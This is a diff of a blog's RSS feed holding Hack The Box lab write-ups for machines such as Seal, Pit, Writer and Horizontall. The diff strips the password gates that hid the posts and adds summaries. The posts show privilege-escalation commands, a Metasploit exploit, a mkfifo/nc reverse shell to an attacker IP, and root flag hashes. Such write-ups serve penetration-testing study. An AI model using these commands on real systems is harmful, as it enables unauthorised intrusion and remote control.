@@ -14,13 +14,11 @@
       <pubDate>Tue, 07 Sep 2021 13:20:07 +0200</pubDate>
       
       <guid>/labs/the_notebook/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi.
+2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called &amp;lsquo;admin&amp;rsquo;.
+3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find:
+Header: { &amp;#34;typ&amp;#34;: &amp;#34;JWT&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;RS256&amp;#34;, &amp;#34;kid&amp;#34;: &amp;#34;http://localhost:7070/privKey.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi.&lt;/p&gt;
 &lt;p&gt;2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called &amp;lsquo;admin&amp;rsquo;.&lt;/p&gt;
 &lt;p&gt;3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find:&lt;/p&gt;
@@ -137,37 +135,12 @@ python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;7070&lt;/span&g
       <pubDate>Tue, 07 Sep 2021 13:19:57 +0200</pubDate>
       
       <guid>/labs/seal/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
-  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
-    
-      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
-    
-  &lt;/div&gt;
-  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-input&#34;
-      placeholder=&#39;Please input the password&#39;
-    /&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-button&#34;
-      type=&#34;button&#34;
-      value=&#39;Click to verify&#39;
-      onclick=&#34;_click_handler(this)&#34;
-    /&gt;
-  &lt;/div&gt;
-  &lt;div
-    class=&#34;hugo-encryptor-cipher-text&#34;
-    data-password=&#34;13302f0959a0be8c868a95076136a391&#34;
-    style=&#34;display: none;&#34;
-  &gt;
-    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
-    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx)
+2- After visiting seal.htb:8080 redirects to
+http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F Set-Cookie: JSESSIONID=node0eechasxnr4hcp25y400b85jc53.node0; node0 is repeated. 401 Unauthorized. jsessionid cookie is passed in the url, redirect param is &amp;lsquo;/&amp;rsquo;.
+3- Register an account in Gitbucket and access the source code of the webapp. There are three directories: app, tomcat, nginx. The TODO list mentions:
+3.1- Remove mutual authentication for dashboard, setup registration and login features.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx)&lt;/p&gt;
 &lt;p&gt;2- After visiting seal.htb:8080 redirects to&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F
@@ -219,9 +192,7 @@ file reveals it&amp;rsquo;s a tar gz file &amp;ndash;&amp;gt; &lt;code&gt;tar xv
 &lt;p&gt;10- sudo -l&lt;/p&gt;
 &lt;p&gt;See &lt;a href=&#34;https://gtfobins.github.io/gtfobins/ansible-playbook/&#34;&gt;https://gtfobins.github.io/gtfobins/ansible-playbook/&lt;/a&gt;. It&amp;rsquo;s very straighforward since ansible playbook is an automation tool which can run any command.&lt;/p&gt;
 &lt;p&gt;root.txt: 13302f0959a0be8c868a95076136a391&lt;/p&gt;
-
-  &lt;/div&gt;
-&lt;/div&gt;</content>
+</content>
     </item>
     
     <item>
@@ -230,13 +201,12 @@ file reveals it&amp;rsquo;s a tar gz file &amp;ndash;&amp;gt; &lt;code&gt;tar xv
       <pubDate>Tue, 07 Sep 2021 13:19:47 +0200</pubDate>
       
       <guid>/labs/schooled/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- nmap discovered 22, 80, 33060 (mysqlx)
+2- Web clues:
+ contact.php -&amp;gt; 404 email: admissions@schooled.htb web address schooled.htb -&amp;gt; suggests there can be subdomains  3- Fuzzing vhost.
+wfuzz -c -u &amp;#34;http://schooled.htb/&amp;#34; -H &amp;#34;Host:FUZZ.schooled.htb&amp;#34; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hl 461 # (Hide those whose line is 461).  Found moodle.schooled.htb.
+4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- nmap discovered 22, 80, 33060 (mysqlx)&lt;/p&gt;
 &lt;p&gt;2- Web clues:&lt;/p&gt;
 &lt;ul&gt;
@@ -311,7 +281,8 @@ echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/etc/my.conf&a
 
 pkg create -m &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;STAGEDIR&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;/ -r &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;STAGEDIR&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;/ -p &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;STAGEDIR&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;/plist -o .
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;18- bash -p (this option exploits the SETUID bit if set).&lt;/p&gt;
-&lt;p&gt;root.txt: 85336d96f89869c69d073a90de2730b1&lt;/p&gt;</content>
+&lt;p&gt;root.txt: 85336d96f89869c69d073a90de2730b1&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -320,37 +291,9 @@ pkg create -m &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;STAGEDIR&
       <pubDate>Tue, 07 Sep 2021 13:19:41 +0200</pubDate>
       
       <guid>/labs/pit/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
-  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
-    
-      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
-    
-  &lt;/div&gt;
-  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-input&#34;
-      placeholder=&#39;Please input the password&#39;
-    /&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-button&#34;
-      type=&#34;button&#34;
-      value=&#39;Click to verify&#39;
-      onclick=&#34;_click_handler(this)&#34;
-    /&gt;
-  &lt;/div&gt;
-  &lt;div
-    class=&#34;hugo-encryptor-cipher-text&#34;
-    data-password=&#34;b96ee993d16220d6c0c0d519a4179b46&#34;
-    style=&#34;display: none;&#34;
-  &gt;
-    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
-    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap discovered 22, 80, 9090. Port 9090 is an http port for remote connection to CentOS. We have to log in with in the server user account. From ssl port I retrieved the commonName dms-pit.htb. 9090 seems to be zeus-admin service.
+I really shouldn&amp;rsquo;t ignore UDP ports in a pentest&amp;hellip; DNS, SNMP, and DHCP (registered ports 53, 161/162, and 67/68) are juicy ports. Nmap udp ports to check for SNMP, DNS or DHCP.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap discovered 22, 80, 9090. Port 9090 is an http port for remote connection to CentOS. We have to log in with in the server user account. From ssl port I retrieved the commonName dms-pit.htb. 9090 seems to be zeus-admin service.&lt;/p&gt;
 &lt;p&gt;I really shouldn&amp;rsquo;t ignore UDP ports in a pentest&amp;hellip;
 DNS, SNMP, and DHCP (registered ports 53, 161/162, and 67/68) are juicy ports.
@@ -486,9 +429,7 @@ other::---
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -i root root@pit.htb
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;root.txt: b96ee993d16220d6c0c0d519a4179b46&lt;/p&gt;
-
-  &lt;/div&gt;
-&lt;/div&gt;</content>
+</content>
     </item>
     
     <item>
@@ -497,13 +438,9 @@ other::---
       <pubDate>Tue, 07 Sep 2021 13:19:35 +0200</pubDate>
       
       <guid>/labs/love/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).
+2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).&lt;/p&gt;
 &lt;p&gt;2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000. The port 5000 service returns 403 Forbidden, probably due to IP restriction. 443 port responds with 403 Forbidden but the ssl-cert reveals a commonName = staging.love.htb&lt;/p&gt;
 &lt;p&gt;3- The pivot points left are the Windows version itself (found Unified Remote 3.9.0.2463, not useful here), Apache 2.4.46 (no exploits found except Optionsbleed, not useful here), web on target and staging.love.htb and samba (I am not experienced enough for now).&lt;/p&gt;
@@ -528,7 +465,7 @@ use exploit/windows/local/always_install_elevated
 set session &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 
 set LHOST xxxxx
 exploit 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;13- GOT NT AUTHORITY/SYSTEM shell.&lt;/p&gt;</content>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
     </item>
     
     <item>
@@ -537,13 +474,8 @@ exploit
       <pubDate>Tue, 07 Sep 2021 13:19:29 +0200</pubDate>
       
       <guid>/labs/knife/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold  Nmap to find ports 22 and 80. There seems to be no exploit from Apache and OpenSSH versions. Inspect the HTML and the web request. Use nikto to scan. Found PHP version 8 dev, for which there is an exploit in ExploitDB. Get user shell using the backdoor PHP exploit.  Privilege escalation sudo -l to find knife. knife can execute ruby script, so:  sudo knife exec -E &amp;#39;exec &amp;#34;/bin/bash&amp;#34;&amp;#39; Note that we didn&amp;rsquo;t use SSH.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;ol&gt;
 &lt;li&gt;Nmap to find ports 22 and 80. There seems to be no exploit from Apache and OpenSSH versions.&lt;/li&gt;
 &lt;li&gt;Inspect the HTML and the web request. Use nikto to scan. Found PHP version 8 dev, for which there is an exploit in ExploitDB.&lt;/li&gt;
@@ -554,7 +486,8 @@ exploit
 &lt;li&gt;&lt;code&gt;sudo -l&lt;/code&gt; to find knife. knife can execute ruby script, so:&lt;/li&gt;
 &lt;/ol&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo knife exec -E &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exec &amp;#34;/bin/bash&amp;#34;&amp;#39;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that we didn&amp;rsquo;t use SSH. Another potential solution would be to bruteforce the SSH connection.&lt;/p&gt;</content>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that we didn&amp;rsquo;t use SSH. Another potential solution would be to bruteforce the SSH connection.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -563,37 +496,9 @@ exploit
       <pubDate>Tue, 07 Sep 2021 13:19:23 +0200</pubDate>
       
       <guid>/labs/intelligence/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
-  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
-    
-      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
-    
-  &lt;/div&gt;
-  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-input&#34;
-      placeholder=&#39;Please input the password&#39;
-    /&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-button&#34;
-      type=&#34;button&#34;
-      value=&#39;Click to verify&#39;
-      onclick=&#34;_click_handler(this)&#34;
-    /&gt;
-  &lt;/div&gt;
-  &lt;div
-    class=&#34;hugo-encryptor-cipher-text&#34;
-    data-password=&#34;676a7f4d669819b40d5d8ef5aadb6f5c&#34;
-    style=&#34;display: none;&#34;
-  &gt;
-    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
-    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap: 53 -&amp;gt; dns 139 -&amp;gt; netbios 445 -&amp;gt; smb 135 -&amp;gt; rpc 593 -&amp;gt; ncacn http, rpc 5985 -&amp;gt; winrm 389, 636, 3268, 3269 -&amp;gt; LDAP, Active Directory is on 88 -&amp;gt; Kerberos, it is a domain controller 464 -&amp;gt; kpasswd5, kerberos password change, not interesting 80 -&amp;gt; web server IIS 10.0 5985 -&amp;gt; Microsoft HTTPAPI, not interesting 9389 -&amp;gt; .NET Message Framing (?)
+Services: samba suite (smbclient, rpcclient), evil-winrm, web, ldap,</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap:
 53 -&amp;gt; dns
 139 -&amp;gt; netbios
@@ -787,9 +692,7 @@ OR psexec.py&lt;/p&gt;
 &lt;p&gt;psexec.py -k -no-pass &lt;a href=&#34;mailto:intelligence.htb/Administrator@dc.intelligence.htb&#34;&gt;intelligence.htb/Administrator@dc.intelligence.htb&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;root: 676a7f4d669819b40d5d8ef5aadb6f5c&lt;/p&gt;
-
-  &lt;/div&gt;
-&lt;/div&gt;</content>
+</content>
     </item>
     
     <item>
@@ -798,13 +701,9 @@ OR psexec.py&lt;/p&gt;
       <pubDate>Tue, 07 Sep 2021 13:19:14 +0200</pubDate>
       
       <guid>/labs/explore/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap for all ports.
+# Nmap 7.91 scan initiated Tue Jul 20 07:48:06 2021 as: nmap -sC -sV -p- -oA nmap target Nmap scan report for target (10.10.10.247) Host is up (0.061s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 38595/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap for all ports.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Tue Jul 20 07:48:06 2021 as: nmap -sC -sV -p- -oA nmap target
 Nmap scan report for target (10.10.10.247)
@@ -921,37 +820,10 @@ adb_connection(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10.10.10.247&a
       <pubDate>Tue, 07 Sep 2021 13:19:08 +0200</pubDate>
       
       <guid>/labs/dynstr/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
-  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
-    
-      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
-    
-  &lt;/div&gt;
-  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-input&#34;
-      placeholder=&#39;Please input the password&#39;
-    /&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-button&#34;
-      type=&#34;button&#34;
-      value=&#39;Click to verify&#39;
-      onclick=&#34;_click_handler(this)&#34;
-    /&gt;
-  &lt;/div&gt;
-  &lt;div
-    class=&#34;hugo-encryptor-cipher-text&#34;
-    data-password=&#34;c2ba74897b445b0e30466fa9d7b26253&#34;
-    style=&#34;display: none;&#34;
-  &gt;
-    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
-    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap discovered ports 22, 80, 53.
+80 -&amp;gt; Apache/2.4.41 53 -&amp;gt; ISC BIND 9.16.1
+# Nmap 7.91 scan initiated Wed Sep 1 19:36:11 2021 as: nmap -sC -sV -p- -v -oA tcp dynstr.htb Nmap scan report for dynstr.htb (10.10.10.244) Host is up (0.090s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA) | 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA) |_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519) 53/tcp open domain ISC BIND 9.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap discovered ports 22, 80, 53.&lt;/p&gt;
 &lt;p&gt;80 -&amp;gt; Apache/2.4.41
 53 -&amp;gt; ISC BIND 9.16.1&lt;/p&gt;
@@ -1144,9 +1016,7 @@ sudo bindmgr.sh
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cd /etc/bind/named.bindmgr/
 bash -p
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;root.txt: c2ba74897b445b0e30466fa9d7b26253&lt;/p&gt;
-
-  &lt;/div&gt;
-&lt;/div&gt;</content>
+</content>
     </item>
     
     <item>
@@ -1155,13 +1025,9 @@ bash -p
       <pubDate>Tue, 07 Sep 2021 13:18:54 +0200</pubDate>
       
       <guid>/labs/armageddon/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).
+# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.062s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Jul  3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233
 Nmap scan report for 10.10.10.233
@@ -1252,37 +1118,12 @@ grade: devel
       <pubDate>Tue, 07 Sep 2021 13:18:30 +0200</pubDate>
       
       <guid>/labs/writer/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: medium&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
-  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
-    
-      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
-    
-  &lt;/div&gt;
-  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-input&#34;
-      placeholder=&#39;Please input the password&#39;
-    /&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-button&#34;
-      type=&#34;button&#34;
-      value=&#39;Click to verify&#39;
-      onclick=&#34;_click_handler(this)&#34;
-    /&gt;
-  &lt;/div&gt;
-  &lt;div
-    class=&#34;hugo-encryptor-cipher-text&#34;
-    data-password=&#34;210339aaef5e0225ff2fc6e0677ee7cc&#34;
-    style=&#34;display: none;&#34;
-  &gt;
-    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
-    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap found 80 (http), 139, 445 (SMB), 22 (ssh)
+2- Web discovery potential exploits:
+ Uses php, contact page validate.js accesses contact.php but it returns 404??? Subdomain fuzzing? wfuzz -c -u &amp;ldquo;http://writer.htb/&amp;quot; -H &amp;ldquo;Host:FUZZ.writer.htb&amp;rdquo; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt &amp;ndash;hl=318 -&amp;gt; None Path fuzzing: wfuzz -c -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -u http://writer.htb/FUZZ Found dashboard, administrative.  3- SMB scanning?
+enum4linux -a writer.htb &amp;gt; smb_enum.txt # https://book.hacktricks.xyz/pentesting/pentesting-smb Intel:
+ Usernames: john, kyle (Kyle Travis) Domains: WRITER, Builtin WRITER/kyle  With blank username and password we CANNOT access IPC or writer2_projects shares.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap found 80 (http), 139, 445 (SMB), 22 (ssh)&lt;/p&gt;
 &lt;p&gt;2- Web discovery potential exploits:&lt;/p&gt;
 &lt;ul&gt;
@@ -1376,9 +1217,7 @@ exit $?
   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&amp;gt;&amp;amp;1 | nc 10.10.14.44 1234 &amp;gt; /tmp/f&amp;#34;&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;root.txt: 210339aaef5e0225ff2fc6e0677ee7cc&lt;/p&gt;
-
-  &lt;/div&gt;
-&lt;/div&gt;</content>
+</content>
     </item>
     
     <item>
@@ -1387,37 +1226,11 @@ exit $?
       <pubDate>Tue, 07 Sep 2021 13:18:01 +0200</pubDate>
       
       <guid>/labs/horizontall/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
-  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
-    
-      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
-    
-  &lt;/div&gt;
-  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-input&#34;
-      placeholder=&#39;Please input the password&#39;
-    /&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-button&#34;
-      type=&#34;button&#34;
-      value=&#39;Click to verify&#39;
-      onclick=&#34;_click_handler(this)&#34;
-    /&gt;
-  &lt;/div&gt;
-  &lt;div
-    class=&#34;hugo-encryptor-cipher-text&#34;
-    data-password=&#34;095ff8dc5f20b8e1aef209106c989d0c&#34;
-    style=&#34;display: none;&#34;
-  &gt;
-    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
-    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap discovered 80 and 22.
+2- The webpage index.html doesn&amp;rsquo;t seem to be interactive. Enumerate web server with Nikto and inspect the JS files.
+nikto -h horizontall.htb Vue.js v2.6.12 vue-router v3.5.1 portal-vue 2.1.7 (Although I doubt front end is any juicy to attack&amp;hellip;)
+nginx/1.14.0 (Ubuntu) 3- nginx 1.14.0 has vulnerabilities that allow RCE: CVE-2021-23017&amp;gt; https://www.cybersecurity-help.cz/exploits/53543/?ref=bulletin &amp;ndash;&amp;gt; but requires that the victim nginx is capable of resolving dns names (the dns resolver feature is not on by default)</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap discovered 80 and 22.&lt;/p&gt;
 &lt;p&gt;2- The webpage index.html doesn&amp;rsquo;t seem to be interactive. Enumerate web server with Nikto and inspect the JS files.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nikto -h horizontall.htb
@@ -1537,9 +1350,7 @@ strapi:x:1001:1001::/opt/strapi:/bin/sh
